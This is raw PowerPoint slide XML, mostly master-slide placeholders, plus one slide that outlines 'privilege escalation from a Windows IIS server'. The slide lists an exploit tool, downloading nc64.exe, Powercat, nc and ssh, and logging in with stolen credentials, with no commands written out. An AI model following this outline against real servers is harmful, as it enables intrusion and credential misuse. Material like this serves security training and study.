        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14609710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122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="86727929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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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ja-JP" altLang="en-US"/>
              <a:t>マスター テキストの書式設定</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Date Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="198502098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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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ja-JP" altLang="en-US"/>
              <a:t>アイコンをクリックして図を追加</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ja-JP" altLang="en-US"/>
              <a:t>マスター テキストの書式設定</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Date Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="137748966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Vertical Text Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" orient="vert" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr vert="eaVe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10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="259982287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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:fld id="{1122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</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E73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="374506804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ja-JP" altLang="en-US"/>
              <a:t>マスター タイトルの書式設定</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122D4BA-0B73-4C7C-AC23-04348FAD23B9}" type="datetimeFigureOut">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>2026/4/6</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" alt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ja-JP" alt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73FD4BC-63AB-4C6F-9997-14C37C4BE690}" type="slidenum">
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1485736886"/>
      </p:ext>
    </p:extLst>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en-US"/>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 name="四角形: 角を丸くする 76">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4D8C7109-BCB9-4099-8CFF-100C6050DF24}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6591644" y="1586457"/>
            <a:ext cx="4878244" cy="1249686"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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t>c</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="78" name="テキスト ボックス 77">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F25E53D-22CA-4594-9B83-DEC6726C2C1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6840673" y="2275381"/>
            <a:ext cx="4387181" cy="830997"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Download tool(nc64.exe)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    Use Powercat</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="79" name="グループ化 78">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E03B1060-4008-4289-98BD-D85CCF88E71A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6677761" y="1727741"/>
            <a:ext cx="4749018" cy="446123"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="646332"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="80" name="四角形: 角を丸くする 79">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B94CC2D-A3DA-43A1-A1A1-030C6C525FF4}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2472065" y="3278783"/>
              <a:ext cx="7825471" cy="64633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00" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="81" name="四角形: 角を丸くする 80">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EFE7F50B-7D31-44A4-8051-A6305F4FE67A}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="2627194" y="3383918"/>
              <a:ext cx="1967591" cy="444288"/>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200" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="tx1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Exploitation</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="82" name="テキスト ボックス 81">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7243ED5A-8DDD-4AB6-A41A-ABC58206FD75}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="4771937" y="3319285"/>
              <a:ext cx="5585394" cy="445900"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>Use Exploit Tool</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="四角形: 角を丸くする 66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985FF41F-BE90-4796-8264-5F7ED2D9B075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6571273" y="95997"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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t>c</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74" name="テキスト ボックス 73">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5A1517C-3544-45F6-9CC6-79A4F98D456E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6764938" y="794662"/>
            <a:ext cx="4387181" cy="1077218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>ssh,nc,Get-NetTCPconnection</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    login with </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>credencial</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> information</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   </a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="62" name="四角形: 角を丸くする 61">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E89D79B4-3DCA-4877-8F4D-54456BA650A5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="3054266"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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8" name="テキスト ボックス 37">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B2DB12C-4E99-452F-9BFE-063F94103C7E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="77895" y="328215"/>
            <a:ext cx="8065979" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach1:Privilege escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>				 from a Windows IIS server</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="64" name="四角形: 角を丸くする 63">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F84F164-B51C-48DE-8866-B963762B669E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6534872" y="4549258"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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1" name="四角形: 角を丸くする 60">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7C53EDB0-60AB-4110-814A-3CA3D3E415D6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="4565074"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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0" name="四角形: 角を丸くする 59">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BEFF2B5F-A462-4595-ACA7-86BA8E8DB2A7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1538161" y="3004765"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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8" name="四角形: 角を丸くする 27">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{12DAA20C-4E27-4E82-9EDC-874E7D263C87}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1537134" y="1432950"/>
            <a:ext cx="4878244" cy="1388671"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="22" name="グループ化 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42988117-EB1A-4DE9-B9C7-C66D6313DD55}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="328601" y="1320203"/>
            <a:ext cx="2039711" cy="1045029"/>
            <a:chOff x="639988" y="987878"/>
            <a:chExt cx="2039711" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="21" name="グループ化 20">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6605FE0D-B6A5-4872-B38B-C9420253B64C}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="639988" y="987878"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="639988" y="987878"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="9" name="四角形: 角を丸くする 8">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{20A5D123-2648-46C4-91C6-7D217A6A2D87}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="639988" y="987878"/>
                <a:ext cx="1126671" cy="759279"/>
              </a:xfrm>
              <a:prstGeom prst="roundRect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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二等辺三角形 9">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F55D6590-8BEF-4C54-A519-9C00E9FD11B1}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="871310" y="1747157"/>
                <a:ext cx="664027" cy="285750"/>
              </a:xfrm>
              <a:prstGeom prst="triangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="DB0B0B"/>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正方形/長方形 10">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{69DDE372-227B-484F-8C89-C32F9237DC30}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="758369" y="1094618"/>
                <a:ext cx="889907" cy="545798"/>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15" name="テキスト ボックス 14">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9A6C198F-BEB5-45E6-A5CE-78DE4CE15F22}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="712107" y="1236712"/>
              <a:ext cx="1967592" cy="261610"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1050" dirty="0" err="1"/>
                <a:t>AdversaryPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1050" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="20" name="グループ化 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A0F568C-FD3E-4960-9019-26D33DA84078}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10976968" y="5700666"/>
            <a:ext cx="2169661" cy="1045029"/>
            <a:chOff x="8990237" y="5765648"/>
            <a:chExt cx="2169661" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="19" name="グループ化 18">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0EA675E4-9A30-4BEE-9EF8-B1692957D861}"/>
